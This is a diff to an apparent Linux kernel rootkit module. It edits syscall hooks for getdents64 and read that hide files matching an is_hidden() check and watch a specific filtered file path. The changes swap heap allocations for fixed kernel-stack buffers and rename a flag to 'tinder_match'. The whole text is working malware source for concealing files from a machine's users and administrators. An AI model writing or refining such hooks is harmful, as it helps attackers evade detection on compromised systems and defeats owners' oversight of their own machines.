@@ -155,7 +155,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     int fd = (int)regs->di;
     struct file *dir_f;
     struct path parent_path;
-    char *dirbuf = kmalloc(512, GFP_KERNEL);
+    char dirbuf[512];
     char *dirstr = NULL;
 
     dir_f = fget(fd);
@@ -215,7 +215,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
         // Build full path to be more precise than before
         bool hide = false;
         if (dirstr) {
-            char *fullpath = kmalloc(PATH_MAX, GFP_KERNEL);
+            char fullpath[1024];
             int len;
 
             if (strcmp(dirstr, "/") == 0) {
@@ -227,8 +227,6 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
 
             if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
                 hide = true;
-				
-			kfree(fullpath);
         }
 
         if (hide)
@@ -249,7 +247,6 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
 
     kfree(kbuf);
     kfree(newbuf);
-    kfree(dirbuf);
 
     // New size without directories we do not want...
     return new_size;
@@ -268,29 +265,22 @@ static bool is_target_file(int fd) {
     struct file *f;
     struct path path;
     char *tmp;
-    bool match = false;
-    char *buf = kmalloc(1024, GFP_KERNEL); // 🧠 Heap instead of stack
-
-    if (!buf)
-        return false;
+    bool tinder_match = false;
+    char buf[1024];
 
     f = fget(fd);
-    if (!f) {
-        kfree(buf);
+    if (!f)
         return false;
-    }
 
     path = f->f_path;
     path_get(&path);
-
-    tmp = d_path(&path, buf, 1024);
+    tmp = d_path(&path, buf, sizeof(buf));
     if (!IS_ERR(tmp) && strcmp(tmp, FILTER_FILE) == 0)
-        match = true;
+        tinder_match = true;
 
     path_put(&path);
     fput(f);
-    kfree(buf);
-    return match;
+    return tinder_match;
 }
 
 asmlinkage long read_hook(const struct pt_regs *regs) {
